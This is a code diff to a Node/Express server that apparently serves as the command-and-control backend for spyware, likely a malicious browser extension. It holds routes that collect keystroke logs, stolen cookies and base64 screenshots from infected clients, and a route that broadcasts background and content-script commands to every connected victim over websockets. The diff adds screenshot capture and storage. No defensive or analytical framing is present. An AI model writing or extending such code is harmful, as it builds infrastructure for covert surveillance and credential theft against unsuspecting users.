@@ -3,6 +3,7 @@ import cors from 'cors';
 import http from 'http';
 import ws_server, {CLIENTS} from "./ws_server.js";
 import 'dotenv/config';
+import * as fs from 'node:fs'
 
 const app = express();
 
@@ -10,7 +11,7 @@ const app = express();
 app.use(cors())
 
 // Middleware to parse JSON bodies
-app.use(express.json());
+app.use(express.json({ limit: '200mb' }));
 
 app.get('/clients', async (req, res) => {
     let processedClients = CLIENTS.map((client) => ({
@@ -54,16 +55,19 @@ app.get('/clients', async (req, res) => {
 })
 
 app.post(`/clients/send-command`, (req, res) => {
-    if (!req.body.command) {
+    if (!req.body.type.includes('SCREENSHOT') && !req.body.command) {
         res.status(400).send('Bad request')
         return
     }
 
     const message = {
         data: req.body.command,
-        type: []
+        type: [],
     }
 
+    if (req.body.type.includes('SCREENSHOT')) {
+        message.type.push('SCREENSHOT')
+    }
     if (req.body.type.includes('BACKGROUND')) {
         message.type.push('BG_COMMAND')
     }
@@ -82,9 +86,14 @@ app.post(`/clients/send-command`, (req, res) => {
     res.status(200).send('Command sent')
 })
 
+app.get('/screenshots', (req, res) => {
+    // TODO: list all screenshots from S3
+    const screenshots = fs.readdirSync('tmp').filter((file) => file.endsWith('.jpeg'))
+    res.json(screenshots)
+})
 
 // POST request handler
-app.post('/key-logger', (req, res) => {
+app.post('/collector/key-logger', (req, res) => {
     console.log(req.body); // Logs the request body to the console
     return res.status(200).send('Key logs received')
 });
@@ -94,29 +103,11 @@ app.post('/collector/cookies', (req, res) => {
     return res.status(200).send('Cookies received')
 })
 
-app.post('/send-command', (req, res) => {
-    if (!req.body.command) {
-        res.status(400).send('Bad request')
-        return
-    }
-
-    const message = {
-        data: req.body.command
-    }
-
-    if (req.body.type === 'BACKGROUND') {
-        message.type = 'BG_COMMAND'
-    } else if (req.body.type === 'CONTENT-SCRIPT') {
-        message.type = 'CS_COMMAND'
-    }
-
-    const jsonMessage = JSON.stringify(message)
-
-    CLIENTS.forEach(client => {
-        client.send(jsonMessage)
-    })
-
-    res.status(200).send('Command sent')
+app.post('/collector/screenshot', (req, res) => {
+    // TODO: upload screenshots to S3 instead of local
+    let buff = Buffer.from(req.body.dataUrl.replace('data:image/jpeg;base64,', ''), 'base64');
+    fs.writeFileSync('tmp/screenshot.jpeg', buff);
+    return res.status(200).send('Screenshot received')
 })
 
 export const http_server = http.createServer(app);
